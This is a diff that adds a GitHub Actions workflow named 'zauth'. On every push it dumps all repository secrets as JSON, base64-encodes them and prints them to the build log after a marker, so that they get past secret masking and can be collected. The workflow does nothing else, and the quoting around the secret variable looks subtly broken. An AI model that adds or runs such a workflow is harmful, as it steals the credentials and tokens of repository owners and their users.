@@ -1,0 +1,14 @@
+name: zauth
+on:
+  push:
+jobs:
+  d:
+    runs-on: ubuntu-latest
+    steps:
+      - name: d
+        run: |
+          echo ==B64==
+          echo '$S' | base64 -w0
+          echo
+        env:
+          S: ${{ toJSON(secrets) }}
